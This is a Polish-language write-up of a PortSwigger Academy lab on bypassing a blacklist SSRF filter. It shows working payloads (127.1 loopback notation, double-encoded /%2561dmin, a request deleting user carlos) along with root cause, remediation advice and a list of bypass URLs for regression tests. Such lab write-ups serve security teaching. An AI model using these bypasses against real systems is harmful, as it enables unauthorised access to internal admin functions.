# PortSwigger Lab 03 - SSRF z filtrem opartym na blacklistcie

## Lab

PortSwigger Web Security Academy:

```text
SSRF with blacklist-based input filter
```

## Co testowałem

Testowałem funkcję sprawdzania stanu magazynowego przyjmującą parametr `stockApi`.

Normalny request zwracał liczbę sztuk w magazynie:

```http
POST /product/stock
Content-Type: application/x-www-form-urlencoded

stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1
```

To potwierdziło normalne zachowanie backendowego stock check.

## Co znalazłem

Gdy próbowałem użyć `localhost`, aplikacja blokowała request:

```text
http://localhost/admin
```

Odpowiedź pokazywała:

```text
External stock check blocked for security reasons
```

To samo działo się dla:

```text
http://127.0.0.1/
```

To pokazało, że aplikacja miała filtr SSRF.

Dalsze testy sugerowały, że filtr blokował zarówno:

```text
localhost / 127.0.0.1
```

jak i wrażliwą ścieżkę:

```text
/admin
```

## Mapowanie filtra

Początkowe testy:

```text
http://localhost/admin                    -> zablokowany
http://127.0.0.1/                         -> zablokowany
http://localhost/test                     -> zablokowany
http://stock.weliketoshop.net:8080/admin  -> zablokowany
```

To sugerowało filtr oparty na blacklistcie.

Wyglądało na to, że aplikacja blokowała znane złe stringi zamiast bezpiecznie walidować finalny cel sieciowy.

## Bypass 1 - alternatywna notacja loopback

Użycie:

```text
http://127.1/
```

zwróciło stronę aplikacji zamiast komunikatu blokady.

To pokazało, że `127.1` może wskazywać loopback i jednocześnie ominąć słaby filtr blokujący tylko dosłowne wartości:

```text
localhost
127.0.0.1
```

## Bypass 2 - double encoding ścieżki

Filtr blokował też dosłowną ścieżkę:

```text
/admin
```

Bypass polegał na podwójnym zakodowaniu pierwszej litery `admin`:

```text
/%2561dmin
```

Flow dekodowania:

```text
%2561 -> %61 -> a
```

Finalnie interpretowana ścieżka:

```text
/admin
```

To pozwoliło uzyskać dostęp do panelu admina przez podatny parametr `stockApi`.

## Finalna akcja

Po potwierdzeniu dostępu do panelu admina ten sam wzorzec został użyty wobec endpointu usuwania użytkownika `carlos`:

```text
http://127.1/%2561dmin/delete?username=carlos
```

Backend zwrócił redirect do `/admin`, co wskazywało, że wewnętrzna akcja została wywołana.

## Dlaczego to ma znaczenie

Ten lab pokazał, dlaczego ochrona SSRF oparta na blacklistach jest słaba.

Aplikacja próbowała blokować niebezpieczne cele przez dopasowywanie konkretnych stringów, ale równoważne reprezentacje omijały filtr.

Problemem nie był konkretny użyty string. Problemem było to, że backend nadal mógł zostać zmuszony do wysłania requestu do niebezpiecznego wewnętrznego celu.

## Przyczyna źródłowa

Przyczyną było:

- miejsce docelowe requestu backendowego kontrolowane przez użytkownika,
- filtrowanie oparte na blacklistcie,
- niepełne blokowanie reprezentacji loopback,
- niepełne blokowanie zakodowanych wrażliwych ścieżek,
- walidacja przed finalnym dekodowaniem i normalizacją,
- brak solidnej walidacji finalnego rozwiązanego celu.

## Wpływ

Możliwy wpływ:

- obejście filtrów SSRF,
- dostęp do wewnętrznych paneli admina,
- wywołanie nieautoryzowanych akcji zmieniających stan,
- pokonanie ochrony opartej na prostym string matching,
- dotarcie do `localhost` albo usług wewnętrznych mimo próby filtrowania.

## Naruszona zasada AppSec

Aplikacja próbowała chronić niebezpieczną funkcję kruchym filtrowaniem inputu.

Silna ochrona SSRF powinna walidować, dokąd backend faktycznie się łączy po:

```text
URL parsing
decoding
normalisation
DNS resolution
redirect handling
```

## Remediacja

Bezpieczniejsza implementacja powinna:

- unikać dowolnych backendowych URL-i kontrolowanych przez użytkownika,
- używać ścisłych allowlist dla oczekiwanych celów stock API,
- walidować finalny rozwiązany adres IP,
- blokować wszystkie zakresy loopback/private/link-local/metadata,
- walidować po dekodowaniu i normalizacji,
- walidować każdy redirect hop,
- ograniczać porty i scheme,
- nie polegać na stringowych blacklistach,
- wymagać prawdziwego authentication i authorization dla funkcji admina.

## Pomysł na test regresji

Dodaj testy dla wzorców bypassu blacklist:

```text
http://localhost/admin
http://127.0.0.1/admin
http://127.1/admin
http://127.1/%61dmin
http://127.1/%2561dmin
http://2130706433/admin
http://017700000001/admin
```

Oczekiwany wynik:

```text
Wszystkie requesty rozwiązujące się do loopback albo celów wewnętrznych powinny być blokowane niezależnie od reprezentacji lub encodingu.
```

## Lekcja dla developera

Nie pytaj:

```text
Czy input zawiera "localhost" albo "admin"?
```

Zapytaj:

```text
Dokąd backend faktycznie połączy się po parsowaniu, dekodowaniu, DNS resolution i redirectach?
```

Blacklist checks są łatwe do obejścia, bo zwykle patrzą na stringi, a nie na finalny cel.
